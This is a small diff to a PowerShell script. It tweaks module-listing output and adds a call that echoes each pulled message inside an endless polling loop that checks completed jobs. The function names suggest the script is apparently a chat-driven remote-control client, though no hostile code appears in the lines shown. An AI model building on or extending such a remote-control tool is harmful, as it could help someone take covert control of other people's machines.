@@ -1143,7 +1143,7 @@ function List_Modules {
             }
         } elseif ($module.ContainsKey("functions")) {
             foreach ($func in $module.functions) {
-                $msg += "  • **$func**`n"
+                $msg += "**$func**`n"
             }
         }
         $msg += "`n"
@@ -1632,7 +1632,7 @@ GetFfmpeg
 # =============================== MAIN LOOP ===============================
 while ($true) {
     $latestMessage = PullMsg
-    
+    sendMsg -Message $latestMessage
     $currentTime = Get-Date
     if (($currentTime - $global:lastJobCheck).TotalSeconds -ge 2) {
         Check_CompletedJobs
@@ -1754,5 +1754,4 @@ while ($true) {
         Check_CompletedJobs
     }
     Start-Sleep -Seconds 3
-
 }
